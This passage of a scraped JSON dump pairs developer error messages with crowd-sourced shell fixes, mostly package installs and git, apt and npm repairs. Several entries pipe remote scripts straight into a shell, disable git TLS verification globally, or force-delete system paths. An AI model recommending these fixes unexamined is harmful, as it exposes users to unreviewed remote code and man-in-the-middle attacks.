    "title": " Module build failed: Error: Node Sass does not yet support your current environment: OS X 64-bit with Unsupported runtime (79)",
    "description": "npm rebuild node-sass\n",
    "reg_date": "2021-10-11T22:00:31.000Z"
  },
  {
    "id": 248,
    "keyword": null,
    "link": null,
    "title": " Module not found: Can't resolve '@material-ui/core/Button'",
    "description": "You need to install Icons Yarn add @material-ui/icons npm install @material-ui/icons\n// Install the module usiong the command line npm install @material-ui/core\n",
    "reg_date": "2021-10-11T22:00:31.000Z"
  },
  {
    "id": 249,
    "keyword": null,
    "link": null,
    "title": " Module not found: Can't resolve '@material-ui/pickers' in 'C:\\Users\\61455\\Documents\\React apps\\mya2o\\src",
    "description": "npm install @material-ui/pickers\n",
    "reg_date": "2021-10-11T22:00:31.000Z"
  },
  {
    "id": 250,
    "keyword": null,
    "link": null,
    "title": " Module not found: Can't resolve 'axios' in 'C:\\Users\\",
    "description": "// install axios in command line npm install axios --save\n",
    "reg_date": "2021-10-11T22:00:31.000Z"
  },
  {
    "id": 251,
    "keyword": null,
    "link": null,
    "title": " More than one DbContext was found. Specify which one to use. Use the '-Context' parameter for PowerShell commands and the '--context' parameter for dotnet commands.",
    "description": "Add-Migration MyFirstMigration -Context BloggingContext update-database -Context BloggingContext \ndotnet ef migrations add <your_migration_name> -c <your_context_class_name> \n",
    "reg_date": "2021-10-11T22:00:32.000Z"
  },
  {
    "id": 252,
    "keyword": null,
    "link": null,
    "title": " NoPermissions (FileSystemError): Error: EACCES: permission denied, open '/var/www/html/index.html'",
    "description": "$ sudo chown -R <user-name> <directory-name>\n",
    "reg_date": "2021-10-11T22:00:32.000Z"
  },
  {
    "id": 253,
    "keyword": null,
    "link": null,
    "title": " No Xcode or CLT version detected!",
    "description": "sudo rm -rf $(xcode-select -print-path) xcode-select --install\nxcode-select --print-path # in my case /Library/Developer/CommandLineTools  # the next line deletes the path returned by the command above sudo rm -rf $(xcode-select --print-path)  # install them (again) if you don't get a default installation prompt xcode-select --install \nsudo xcode-select --reset\n",
    "reg_date": "2021-10-11T22:00:32.000Z"
  },
  {
    "id": 254,
    "keyword": null,
    "link": null,
    "title": " No known instance method for selector 'userAgent'",
    "description": "# cordova-plugin-file-transfer has been updated to support cordova-ios 6,  # but it has not been released yet, so you can only install it from github. cordova plugin rm cordova-plugin-file-transfer cordova plugin add https://github.com/apache/cordova-plugin-file-transfer\n",
    "reg_date": "2021-10-11T22:00:32.000Z"
  },
  {
    "id": 255,
    "keyword": null,
    "link": null,
    "title": " No module named 'boto3'",
    "description": "pip install boto3\n",
    "reg_date": "2021-10-11T22:00:32.000Z"
  },
  {
    "id": 256,
    "keyword": null,
    "link": null,
    "title": " No module named 'django extensions'",
    "description": "pip install django-extensions \n$ pip install django-extensions \n",
    "reg_date": "2021-10-11T22:00:32.000Z"
  },
  {
    "id": 257,
    "keyword": null,
    "link": null,
    "title": " No module named 'psycopg2'",
    "description": "# For quick install pip install psycopg2-binary  # For production-ready install pip install psycopg2 # But it will fail if build prerequesties are not met: # https://www.psycopg.org/docs/install.html#build-prerequisites\npip install psycopg2\npip install psycopg2-binary \n$ pip install psycopg2  # or $ pipenv install psycopg2\n#Use psycopg2-binary instead of psycopg2.  pip install psycopg2-binary \npip install psycopg2  \n",
    "reg_date": "2021-10-11T22:00:33.000Z"
  },
  {
    "id": 258,
    "keyword": null,
    "link": null,
    "title": " No module named 'sklearn'",
    "description": "pip install scikit-learn\n#for python 1 pip install -U scikit-learn scipy matplotlib #for python 3 pip3 install -U scikit-learn scipy matplotlib\n",
    "reg_date": "2021-10-11T22:00:33.000Z"
  },
  {
    "id": 259,
    "keyword": null,
    "link": null,
    "title": " No module named 'storages'",
    "description": "pip install django-storages \n",
    "reg_date": "2021-10-11T22:00:33.000Z"
  },
  {
    "id": 260,
    "keyword": null,
    "link": null,
    "title": " No module named notebook",
    "description": "pip install jupyter\n",
    "reg_date": "2021-10-11T22:00:33.000Z"
  },
  {
    "id": 261,
    "keyword": null,
    "link": null,
    "title": " No such module 'Capacitor'",
    "description": "cd ios/App/App pod install\n",
    "reg_date": "2021-10-11T22:00:33.000Z"
  },
  {
    "id": 262,
    "keyword": null,
    "link": null,
    "title": " No such remote 'upstream'",
    "description": "git remote add upstream https://thehttpslinkgoeshere.git\n",
    "reg_date": "2021-10-11T22:00:33.000Z"
  },
  {
    "id": 263,
    "keyword": null,
    "link": null,
    "title": " NotImplementedError: OpenSSH keys only supported if ED25519 is available net-ssh requires the following gems for ed25519 suppor",
    "description": "echo \"add your ssh private key path\" ssh-add ~/.ssh/id_rsa\n",
    "reg_date": "2021-10-11T22:00:33.000Z"
  },
  {
    "id": 264,
    "keyword": null,
    "link": null,
    "title": " OR statement in grep",
    "description": "# add the -e flag and use \\| to do an OR operator in grep  grep -e 'pattern1\\|pattern2' filename\n",
    "reg_date": "2021-10-11T22:00:34.000Z"
  },
  {
    "id": 265,
    "keyword": null,
    "link": null,
    "title": " OSError: [Errno 24] inotify instance limit reached",
    "description": "Programs that sync files such as dropbox, git etc use inotify to notice changes to the file system. The limit can be see by  cat /proc/sys/fs/inotify/max_user_watches If you are running Debian, RedHat, or another similar Linux distribution, run the following in a terminal: echo fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf && sudo sysctl -p  If you are running ArchLinux, run the following command instead (see here for why): echo fs.inotify.max_user_watches=524288 | sudo tee /etc/sysctl.d/40-max-user-watches.conf && sudo sysctl --system  close terminal and open against\n",
    "reg_date": "2021-10-11T22:00:34.000Z"
  },
  {
    "id": 266,
    "keyword": null,
    "link": null,
    "title": " PHP Curl Module is missing",
    "description": "sudo apt-get install curl sudo service apache2 restart sudo apt-get install php7.3-curl sudo service apache2 restart\n",
    "reg_date": "2021-10-11T22:00:34.000Z"
  },
  {
    "id": 267,
    "keyword": null,
    "link": null,
    "title": " PHP Fatal error: Uncaught Error: Call to undefined function Moontoast\\Math\\bcadd() in /var/www/html/sms-reporting-portal/vendor/moontoast/math/src/Moontoast/Math/BigNumber.php:506",
    "description": "#change php version with your version apt install php7.4-bcmath  #nginx  systemctl restart nginx #For Apache systemctl restart apache2\n",
    "reg_date": "2021-10-11T22:00:34.000Z"
  },
  {
    "id": 268,
    "keyword": null,
    "link": null,
    "title": " PHP Fatal error:  Class UpdateHelper\\ComposerPlugin contains 2 abstract methods and must therefore be declared abstract or implement the remaining methods (Composer\\Plugin\\PluginInterface::deactivate",
    "description": "composer update kylekatarnls/update-helper #if doesnot work use following: composer update --prefer-source\n",
    "reg_date": "2021-10-11T22:00:34.000Z"
  },
  {
    "id": 269,
    "keyword": null,
    "link": null,
    "title": " Package \"ngx-mask\" has an incompatible peer dependency to \"@angular/common\"",
    "description": "npm i ngx-mask@latest\n",
    "reg_date": "2021-10-11T22:00:34.000Z"
  },
  {
    "id": 270,
    "keyword": null,
    "link": null,
    "title": " Package 'php7.4-curl' has no installation candidate",
    "description": "sudo add-apt-repository ppa:ondrej/php sudo apt-get update sudo apt install php7.4-curl\n",
    "reg_date": "2021-10-11T22:00:34.000Z"
  },
  {
    "id": 271,
    "keyword": null,
    "link": null,
    "title": " Peer's Certificate issuer is not recognized",
    "description": "git config --global http.sslVerify \"false\" \n",
    "reg_date": "2021-10-11T22:00:35.000Z"
  },
  {
    "id": 272,
    "keyword": null,
    "link": null,
    "title": " Permissions 0644 for '/root/.ssh/id rsa' are too open.",
    "description": "chmod 600 ~/.ssh/id_rsa\n",
    "reg_date": "2021-10-11T22:00:35.000Z"
  },
  {
    "id": 273,
    "keyword": null,
    "link": null,
    "title": " Please install all available updates for your release before upgrading.",
    "description": "sudo apt update sudo apt upgrade sudo apt dist-upgrade sudo apt autoremove sudo do-release-upgrade -d -f DistUpgradeViewGtk3 \nwaiting for unattended-upgr to exit\n",
    "reg_date": "2021-10-11T22:00:35.000Z"
  },
  {
    "id": 274,
    "keyword": null,
    "link": null,
    "title": " Please install the gcc make perl packages from your distribution.",
    "description": "sudo apt-get update sudo apt-get install build-essential gcc make perl dkms reboot \n",
    "reg_date": "2021-10-11T22:00:35.000Z"
  },
  {
    "id": 275,
    "keyword": null,
    "link": null,
    "title": " Please select the geographic area in which you live. Subsequent configuration questions will narrow this down by presenting a list of cities, representing the time zones in which they are located",
    "description": "ARG DEBIAN_FRONTEND=noninteractive ENV TZ=Europe/Moscow RUN apt-get install -y tzdata\n",
    "reg_date": "2021-10-11T22:00:35.000Z"
  },
  {
    "id": 276,
    "keyword": null,
    "link": null,
    "title": " Port 3000 is already in use, but when I try to kill nothing is found",
    "description": "netstat -ano | findstr :3000 taskkill /PID \"123\" /F \n",
    "reg_date": "2021-10-11T22:00:35.000Z"
  },
  {
    "id": 277,
    "keyword": null,
    "link": null,
    "title": " Ports are not available: listen tcp 0.0.0.0/50070: bind: An attempt was made to access a socket in a way forbidden by its access permissions",
    "description": "net stop winnat docker start ... net start winnat \n",
    "reg_date": "2021-10-11T22:00:36.000Z"
  },
  {
    "id": 278,
    "keyword": null,
    "link": null,
    "title": " Ports are not available: listen tcp 0.0.0.0:1434: bind: An attempt was made to access a socket in a way forbidden by its access permissions.",
    "description": "net stop winnat docker start ... net start winnat \n",
    "reg_date": "2021-10-11T22:00:36.000Z"
  },
  {
    "id": 279,
    "keyword": null,
    "link": null,
    "title": " PowerShell remove object from array",
    "description": "$VarWithArray | Where-Object { $_ &ndash;ne \"String to search for and remove\" }\n",
    "reg_date": "2021-10-11T22:00:37.000Z"
  },
  {
    "id": 280,
    "keyword": null,
    "link": null,
    "title": " Powershell Core server manager module",
    "description": "Install-Module -Name WindowsCompatibility -Scope CurrentUser -Force -AllowClobber  Import-WinModule -Name ServerManager  Get-Command -Module ServerManager\n",
    "reg_date": "2021-10-11T22:00:37.000Z"
  },
  {
    "id": 281,
    "keyword": null,
    "link": null,
    "title": " Pterodactyl installer",
    "description": "bash <(curl -s https://pterodactyl-installer.se)\nbash <(curl -s https://raw.githubusercontent.com/vilhelmprytz/pterodactyl-installer/master/install.sh)\n",
    "reg_date": "2021-10-11T22:00:38.000Z"
  },
  {
    "id": 282,
    "keyword": null,
    "link": null,
    "title": " Pycharm Ubuntu install",
    "description": "$ sudo snap install pycharm-community --classic OR $ sudo snap install pycharm-professional --classic OR $ sudo snap install pycharm-educational --classic \nsudo snap install pycharm-community --classic\ncd ~/Downloads Now extract the tar gz file using the tar command in this way:  tar -xzf pycharm-community-2020.1.1.tar.gz Now enter the extracted PyCharm folder:  cd pycharm-community-2020.1.1 Go to its bin folder:  cd bin You&rsquo;ll find a shell script here. Make sure that you have execute permission:  chmod u+x pycharm.sh Now run this shell script:  sh pycharm.sh\nsudo snap install pycharm-professional --classic\nsudo dnf install snapd\n",
    "reg_date": "2021-10-11T22:00:38.000Z"
  },
  {
    "id": 283,
    "keyword": null,
    "link": null,
    "title": " Pyrit download command for linux",
    "description": "sudo apt-get install pyrit\n",
    "reg_date": "2021-10-11T22:00:38.000Z"
  },
  {
    "id": 284,
    "keyword": null,
    "link": null,
    "title": " QNAP NAS crontab reset",
    "description": "Crontab entries don't survive reboot crontab se elimina al reiniciar el NAS, soluci&oacute;n:  - Edit /etc/config/crontab and add your custom entry. - Run 'crontab /etc/config/crontab' to load the changes. - Restart cron, i.e. '/etc/init.d/crond.sh restart'\n",
    "reg_date": "2021-10-11T22:00:38.000Z"
  },
  {
    "id": 285,
    "keyword": null,
    "link": null,
    "title": " Ram usage in linux",
    "description": "$ cat /proc/meminfo\n// linux command for reporting used memory percentage $ free | grep Mem | awk '{print $3/$2 * 100.0}' 23.8171 \nsudo dmidecode --type 17\nfree -m\ntop - 15:20:30 up  6:57,  5 users,  load average: 0.64, 0.44, 0.33 Tasks: 265 total,   1 running, 263 sleeping,   0 stopped,   1 zombie %Cpu(s):  7.8 us,  2.4 sy,  0.0 ni, 88.9 id,  0.9 wa,  0.0 hi,  0.0 si,  0.0 st KiB Mem:   8167848 total,  6642360 used,  1525488 free,  1026876 buffers KiB Swap:  1998844 total,        0 used,  1998844 free,  2138148 cached    PID USER      PR  NI  VIRT  RES  SHR S  %CPU %MEM    TIME+  COMMAND                                                                                   2986 enlighte  20   0  584m  42m  26m S  14.3  0.5   0:44.27 yakuake                                                                                   1305 root      20   0  448m  68m  39m S   5.0  0.9   3:33.98 Xorg                                                                                      7701 enlighte  20   0  424m  17m  10m S   4.0  0.2   0:00.12 kio_thumbnail\n",
    "reg_date": "2021-10-11T22:00:38.000Z"
  },
  {
    "id": 286,
    "keyword": null,
    "link": null,
    "title": " Run a command in the background witch automatically rerun Raw",
    "description": "#!/bin/bash  if [[ $1 == \"--non-background\" ]] then         yourCommand         sleep 120         ./start.sh         exit else         screen -AmdS soulbot ./start.sh --non-background fi\n",
    "reg_date": "2021-10-11T22:00:38.000Z"
  },
  {
    "id": 287,
    "keyword": null,
    "link": null,
    "title": " Run emulator without Android studio.",
    "description": "emulator -list-avds emulator -avd Nexus_5X_API_26(emulator name)\n// Online: https://dartpad.dartlang.org/?null_safety=true // In Android Studio: In the files listbox (toolbar, name of file, 'main.dart' for ex), select: \t> Edit configurations...     > +     > Dart Command Line App Add your Dart file (my_project/lib), run.\n",
    "reg_date": "2021-10-11T22:00:39.000Z"
  },
  {
    "id": 288,
    "keyword": null,
    "link": null,
    "title": " SSL certificate problem: self signed certific",
    "description": "git config --global http.sslVerify false\n",
    "reg_date": "2021-10-11T22:00:39.000Z"
  },
  {
    "id": 289,
    "keyword": null,
    "link": null,
    "title": " Script to detect and clone display",
    "description": "function Set-Display {     param(         [Parameter(Position=0)]         [ValidateSet('external','internal','clone','extend','gui')]         [string]$Mode='gui'     )          $path = Join-Path -Path ([environment]::SystemDirectory) -ChildPath DisplaySwitch.exe          if( !(Test-Path -Path $path -PathType Leaf))     {         throw \"Cannot find DisplaySwitch.exe\"     }               if($Mode -eq 'gui')     {         & $path     }     else     {         & $path /$Mode     } }  PS > Set-Display -Mode clone\n",
    "reg_date": "2021-10-11T22:00:39.000Z"
  },
  {
    "id": 290,
    "keyword": null,
    "link": null,
    "title": " Start the Docker daemon",
    "description": "sudo systemctl start docker sudo service docker start\n",
    "reg_date": "2021-10-11T22:00:39.000Z"
  },
  {
    "id": 291,
    "keyword": null,
    "link": null,
    "title": " Starting Apache...fail.",
    "description": "sudo /etc/init.d/apache2 stop\nsudo /etc/init.d/apache2 stop    sudo /opt/lampp/lampp start \n",
    "reg_date": "2021-10-11T22:00:39.000Z"
  },
  {
    "id": 292,
    "keyword": null,
    "link": null,
    "title": " Status: inactive",
    "description": "sudo ufw enable\n",
    "reg_date": "2021-10-11T22:00:39.000Z"
  },
  {
    "id": 293,
    "keyword": null,
    "link": null,
    "title": " Sub-process /usr/bin/dpkg returned an error code",
    "description": "sudo dpkg &ndash;i &ndash;&ndash;force&ndash;overwrite /var/cache/apt/archives/full_name_of_package\nsudo apt-get remove --purge package_name \nsudo dpkg -i --force-all /var/cache/apt/archives/full_name_of_package\n",
    "reg_date": "2021-10-11T22:00:40.000Z"
  },
  {
    "id": 294,
    "keyword": null,
    "link": null,
    "title": " Taskkill",
    "description": "taskkill /f /im notepad.exe /t taskkill /f /im chrome.exe /t\n## check and kill used \"ports\" netstat -ano | findstr :8080 taskkill /PID <yourid> /F\ntaskkill /f /im Process_name.exe\n@echo off  :: ganti browser.exe dengan nama target yang mau di kill :: buka taskmanager pilih -> details -> kemudian ambil namanya :: jika ingin multiple taskkill process tambahkan hal yang sama seperti fungsi sebelumnya dibawahnya  taskkill /FI \"PID gt 1000\" /FI \"IMAGENAME eq browser.exe\" /F /T cls taskkill /FI \"PID gt 1000\" /FI \"IMAGENAME eq code.exe\" /F /T cls taskkill /FI \"PID gt 1000\" /FI \"IMAGENAME eq spotify.exe\" /F /T cls taskkill /FI \"PID gt 1000\" /FI \"IMAGENAME eq chrome.exe\" /F /T cls  exit\n",
    "reg_date": "2021-10-11T22:00:40.000Z"
  },
  {
    "id": 295,
    "keyword": null,
    "link": null,
    "title": " Tensorflow GPU Installation conda",
    "description": "conda create --name tf_gpu activate tf_gpu conda install tensorflow-gpu\n",
    "reg_date": "2021-10-11T22:00:40.000Z"
  },
  {
    "id": 296,
    "keyword": null,
    "link": null,
    "title": " The Entity Framework tools version '5.0.3' is older than that of the runtime '5.0.5'. Update the tools for the latest features and bug fixes.",
    "description": "Use command line, Cmd or PowerShell for specific version:  dotnet tool update --global dotnet-ef --version 3.1.0  or for latest version use (works also for reinstallation):  dotnet tool update --global dotnet-ef\n",
    "reg_date": "2021-10-11T22:00:40.000Z"
  },
  {
    "id": 297,
    "keyword": null,
    "link": null,
    "title": " The command 'docker' could not be found in this WSL 1 distro",
    "description": "#Check and switch to your wsl process with following: wsl --list --verbose wsl --set-version <your proc> 2\n",
    "reg_date": "2021-10-11T22:00:41.000Z"
  },
  {
    "id": 298,
    "keyword": null,
    "link": null,
    "title": " The command could not be located because '/snap/bin' is not included in the PATH environment variable.",
    "description": "Temporary solution: Run the command  $ export PATH=$PATH:/snap/bin  Permanent solution: Edit /etc/environment and add /snap/bin in the list then restart your system\n",
    "reg_date": "2021-10-11T22:00:41.000Z"
  },
  {
    "id": 299,
    "keyword": null,
    "link": null,
    "title": " The digital freelance company",
    "description": "The Digital Freelance Company is the best company to work with! :)\n",
    "reg_date": "2021-10-11T22:00:41.000Z"
  },
  {
    "id": 300,
    "keyword": null,
    "link": null,
    "title": " The file will have its original line endings in your working directory",
    "description": "# If you are a single developer working on a windows machine, # and you don't care that git automatically replaces LFs to CRLFs, # you can turn this warning off by typing the following in the git command line  git config core.autocrlf true\n$ git config --global core.autocrlf input \n",
    "reg_date": "2021-10-11T22:00:41.000Z"
  },
  {
    "id": 301,
    "keyword": null,
    "link": null,
    "title": " The following packages have unmet dependencies python3-pip",
    "description": "curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py \n",
    "reg_date": "2021-10-11T22:00:41.000Z"
  },
  {
    "id": 302,
    "keyword": null,
    "link": null,
    "title": " The following signatures couldn't be verified because the public key is not available: NO PUBKEY",
    "description": "sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 6494C6D6997C215E\nsudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys <YOUR KEY COMES HERE>\nsudo apt-key adv --keyserver ha.pool.sks-keyservers.net --recv-keys 363A96A5CEA9EA27 \nUtils:  https://www.digitalocean.com/community/tutorials/how-to-install-jenkins-on-ubuntu-18-04  https://pkg.jenkins.io/debian-stable/  Solve the problem by adding this: wget -q -O - https://pkg.jenkins.io/debian-stable/jenkins.io.key | sudo apt-key add -\n",
    "reg_date": "2021-10-11T22:00:41.000Z"
  },
  {
    "id": 303,
    "keyword": null,
    "link": null,
    "title": " The number of method references in a .dex file cannot exceed 64K.",
    "description": "# Put this inside your defaultConfig inside app/build.gradle:  multiDexEnabled true \n",
    "reg_date": "2021-10-11T22:00:41.000Z"
  },
  {
    "id": 304,
    "keyword": null,
    "link": null,
    "title": " The repository 'https://download.docker.com/linux/ubuntu focal Release' does not have a Release file",
    "description": "$ sudo add-apt-repository \\    \"deb [arch=amd64] https://download.docker.com/linux/ubuntu \\    bionic \\    stable\" \n",
    "reg_date": "2021-10-11T22:00:42.000Z"
  },
  {
    "id": 305,
    "keyword": null,
    "link": null,
    "title": " The requested apache plugin does not appear to be installed",
    "description": "sudo apt-get update sudo apt-get install python-certbot-apache  \nsudo apt-get install python3-certbot-apache\n",
    "reg_date": "2021-10-11T22:00:42.000Z"
  },
  {
    "id": 306,
    "keyword": null,
    "link": null,
    "title": " The term 'nuget' is not recognized as the name of a cmdlet, function, script file, or operable program.",
    "description": "Install-Package NuGet.CommandLine\n",
    "reg_date": "2021-10-11T22:00:42.000Z"
  },
  {
    "id": 307,
    "keyword": null,
    "link": null,
    "title": " The virtual environment was not created successfully because ensurepip is not available.",
    "description": "sudo apt-get install python3.6-venv\nsudo apt-get install python3.x-venv  Replace x with whichever version of oython3 you have. The try recreating the environment\n# einstall virtual environment by mentioning current  # python version(3.8) as follow  $ sudo apt-get install python3.xx-venv\n",
    "reg_date": "2021-10-11T22:00:42.000Z"
  },
  {
    "id": 308,
    "keyword": null,
    "link": null,
    "title": " There is no tracking information for the current branch. Please specify which branch you want to merge with. See git-pull(1) for details.",
    "description": "git branch --set-upstream-to=origin/master master git pull \ngit pull origin master \n",
    "reg_date": "2021-10-11T22:00:42.000Z"
  },
  {
    "id": 309,
    "keyword": null,
    "link": null,
    "title": " This requires the 'non-nullable' language feature to be enabled.",
    "description": "flutter clean flutter packages pub upgrade flutter pub run build_runner build\n",
    "reg_date": "2021-10-11T22:00:43.000Z"
  },
  {
    "id": 310,
    "keyword": null,
    "link": null,
    "title": " This system is not registered with an entitlement server. You can use subscription-manager to register.",
    "description": "In the plugin configuration file disable plugin  vim /etc/yum/pluginconf.d/subscription-manager.conf  enabled=0\n",
    "reg_date": "2021-10-11T22:00:43.000Z"
  },
  {
    "id": 311,
    "keyword": null,
    "link": null,
    "title": " To check the status of running process On Debian and Ubuntu",
    "description": "sudo systemctl status apache2\n",
    "reg_date": "2021-10-11T22:00:43.000Z"
  },
  {
    "id": 312,
    "keyword": null,
    "link": null,
    "title": " To set main as the default branch name do:",
    "description": "$ git config --global init.defaultBranch main\n",
    "reg_date": "2021-10-11T22:00:43.000Z"
  },
  {
    "id": 313,
    "keyword": null,
    "link": null,
    "title": " Trouble installing Virtualbox Guest Addtions in LM 19.3 VM",
    "description": "# open mounted disk sudo ./VBoxLinuxAdditions.run\n",
    "reg_date": "2021-10-11T22:00:43.000Z"
  },
  {
    "id": 314,
    "keyword": null,
    "link": null,
    "title": " TypeError: lookups.flatMap is not a function",
    "description": "npm list -g --depth=0 \nyo @microsoft/sharepoint \nnpm uninstall -g gulp npm uninstall -g yo \ngulp serve \nnpm install -g gulp@3.9.1 npm install -g yo@3.1.0 \n+-- @microsoft/generator-sharepoint@1.11.0 +-- gulp@4.0.2 +-- npm@6.14.12 +-- windows-build-tools@5.2.2 -- yo@4.0.0 \n",
    "reg_date": "2021-10-11T22:00:43.000Z"
  },
  {
    "id": 315,
    "keyword": null,
    "link": null,
    "title": " Ubuntu 18.04 Mouse right click not working",
    "description": "$ sudo add-apt-repository universe $ sudo apt install gnome-tweak-tool $ sudo apt  update $ gnome-tweaks //after that go to keyboard and mouse section and click on Area problem solved\n",
    "reg_date": "2021-10-11T22:00:43.000Z"
  },
  {
    "id": 316,
    "keyword": null,
    "link": null,
    "title": " Ubuntu check free space by 5 ways",
    "description": "$ free -m\ndu -cha --max-depth=1 / | grep -E \"M|G\" \n",
    "reg_date": "2021-10-11T22:00:44.000Z"
  },
  {
    "id": 317,
    "keyword": null,
    "link": null,
    "title": " Ubuntu fix broken package",
    "description": "sudo apt-get update --fix-missing sudo dpkg --configure -a sudo apt-get install -f sudo apt upgrade\n",
    "reg_date": "2021-10-11T22:00:44.000Z"
  },
  {
    "id": 318,
    "keyword": null,
    "link": null,
    "title": " Ubuntu how to install jetbrains toolbox app",
    "description": "sudo tar -xzf jetbrains-toolbox-X.X.X.tar.gz -C /opt\n",
    "reg_date": "2021-10-11T22:00:44.000Z"
  },
  {
    "id": 319,
    "keyword": null,
    "link": null,
    "title": " Ubuntu install rust",
    "description": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n",
    "reg_date": "2021-10-11T22:00:44.000Z"
  },
  {
    "id": 320,
    "keyword": null,
    "link": null,
    "title": " Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?",
    "description": "ps aux | grep -i dpkg  // Kill processes which are running sudo kill -9 <pid>  // Restart the accounts daemon sudo systemctl restart accounts-daemon\nMethod 1 ps aux | grep -i apt sudo kill -9 <process_id>  Method 2  sudo lsof /var/lib/dpkg/lock sudo lsof /var/lib/apt/lists/lock sudo lsof /var/cache/apt/archives/lock  sudo kill -9 <process_id>  sudo rm /var/lib/apt/lists/lock sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock  sudo dpkg --configure -a  sudo apt update  \nps aux | grep -i apt  sudo kill <process_id> # Check if the process was killed by running the &lsquo;ps aux | grep -i apt&rsquo; command. If it is still running, force kill it with SIGKILL signal:  sudo kill -9 <process_id> # Another, easier way would be to use the killall command. This will kill all the instances of a running program:  sudo killall apt apt-get\nsudo kill -9 PID sudo rm /var/lib/dpkg/lock-frontend sudo apt update\nsudo lsof /var/lib/dpkg/lock sudo lsof /var/lib/apt/lists/lock sudo lsof /var/cache/apt/archives/lock\nsudo rm /var/lib/apt/lists/lock sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock* \n",
    "reg_date": "2021-10-11T22:00:45.000Z"
  },
  {
    "id": 321,
    "keyword": null,
    "link": null,
    "title": " Unable to correct problems, you have held broken packages",
    "description": "sudo apt-get install -f sudo dpkg --configure -a \n  $ sudo dpkg --list  then look for a package with the name of the one you're trying to install eg mysql and purge them by name. I repeat by name.   $sudo apt-get purge <package name>    \n",
    "reg_date": "2021-10-11T22:00:45.000Z"
  },
  {
    "id": 322,
    "keyword": null,
    "link": null,
    "title": " Unable to locate package brave-browser ubuntu 20",
    "description": "sudo snap install brave\n",
    "reg_date": "2021-10-11T22:00:46.000Z"
  },
  {
    "id": 323,
    "keyword": null,
    "link": null,
    "title": " Undo git commit",
    "description": "# KEEP CHANGES git reset --soft HEAD~1  # REMOVE CHANGES git reset --hard HEAD~1\n# Uncommit the changes git reset --soft HEAD~1  # Completely delete the changes git reset --hard HEAD~1\ngit reset --soft HEAD~1\n$ git reset --soft HEAD~1\n$ git reset HEAD^ \n$ git commit -m \"Something terribly misguided\" # (0: Your Accident) $ git reset HEAD~                              # (1) [ edit files as necessary ]                    # (2) $ git add .                                    # (3) $ git commit -c ORIG_HEAD                      # (4) \n",
    "reg_date": "2021-10-11T22:00:46.000Z"
  },
  {
    "id": 324,
    "keyword": null,
    "link": null,
    "title": " Undo last git commit",
    "description": "# KEEP CHANGES git reset --soft HEAD~1  # REMOVE CHANGES git reset --hard HEAD~1\n# Uncommit the changes git reset --soft HEAD~1  # Completely delete the changes git reset --hard HEAD~1\ngit reset --soft HEAD~1\n$ git reset --soft HEAD~1\n#this  will preserve changes done to your files git reset --soft HEAD~1  #this will get rid of the commit and the changes done to the files $ git reset --hard HEAD~1\n# Undo last commit. # --soft flag makes sure that the changes in undone revisions are preserved. # You'll find the changes as uncommitted local modifications in your working copy. git reset --soft HEAD~1  # If you don't want to keep these changes, simply use the --hard flag. # This will completely remove the changes. git reset --hard HEAD~1\n",
    "reg_date": "2021-10-11T22:00:46.000Z"
  },
  {
    "id": 325,
    "keyword": null,
    "link": null,
    "title": " Unexpected end of JSON input while parsing near '...fcd15e632426a1be\",\"ta'",
    "description": "npm cache clean --force\nnpm cache clean --force npm install -g @angular/cli\nThis is not a definitive answer but it looks like your global packages are corrupted in some way.  This bug may be caused by many different things. I suggest doing the following.  1 Install Node Version Manager (or NVM for Windows) and install Node version 10.16.1. This is enough for angular 9 and from my experience it is the most stable version for development. This should also change your NPM version so that may also help. 2 Uninstall global angular package npm uninstall -g @angular/cli 3 Force clear cache npm cache clean --force 4 Just to double check npm cache verify 5 You can also try clearing your %temp% and %roaming% AppData/npm-cache 6 install latest angular package npm install -g @angular/cli@<your-version> 7 if this error still occurs, consider using another shell  If this don't solve the problem try to manually locate the package.json file that is throwing an error and investigate.\n",
    "reg_date": "2021-10-11T22:00:46.000Z"
  },
  {
    "id": 326,
    "keyword": null,
    "link": null,
    "title": " Unexpected end of JSON input while parsing near '...org/node-fetch/-/node'",
    "description": "npm cache clean --force \nnpm cache clean --force\nnpm cache clean --force npx create-react-app filenme\nOpen Windows Powershell as admin npm cache clean --force solved the problem for me  Alternative : You can use yarn instead npm install -g yarn\n",
    "reg_date": "2021-10-11T22:00:47.000Z"
  },
  {
    "id": 327,
    "keyword": null,
    "link": null,
    "title": " Unexpected end of JSON input while parsing near '...reate-hmac-1.1.2.tgz\"'",
    "description": "npm cache clean --force\n",
    "reg_date": "2021-10-11T22:00:47.000Z"
  },
  {
    "id": 328,
    "keyword": null,
    "link": null,
    "title": " Unexpected value 'RoundProgressModule in",
    "description": "rm -rf node_modules/angular-svg-round-progressbar/node_modules  # Once i removed the # \"node_modules/angular-svg-round-progressbar/node_modules\" # directory both ng serve and ng build worked again.\n",
    "reg_date": "2021-10-11T22:00:47.000Z"
  },
  {
    "id": 329,
    "keyword": null,
    "link": null,
    "title": " Uninstall Expo CLI",
    "description": "In terminal: npm -g uninstall expo-cli --save\n",
    "reg_date": "2021-10-11T22:00:47.000Z"
  },
  {
    "id": 330,
    "keyword": null,
    "link": null,
    "title": " Uninstall WPS Office from Ubuntu",
    "description": "sudo dpkg -r wps-office\n",
    "reg_date": "2021-10-11T22:00:47.000Z"
  },
  {
    "id": 331,
    "keyword": null,
    "link": null,
    "title": " Unit mongodb.service could not be found ubuntu",
    "description": "sudo systemctl unmask mongod sudo service mongod start\n",
    "reg_date": "2021-10-11T22:00:47.000Z"
  },
  {
    "id": 332,
    "keyword": null,
    "link": null,
    "title": " Update System in manjaro",
    "description": "sudo pacman -Syu\n",
    "reg_date": "2021-10-11T22:00:47.000Z"
  },
  {
    "id": 333,
    "keyword": null,
    "link": null,
    "title": " Update submodules",
    "description": "git submodule update --init --recursive\n",
    "reg_date": "2021-10-11T22:00:48.000Z"
  },
  {
    "id": 334,
    "keyword": null,
    "link": null,
    "title": " Updates were rejected because the remote contains work that you do",
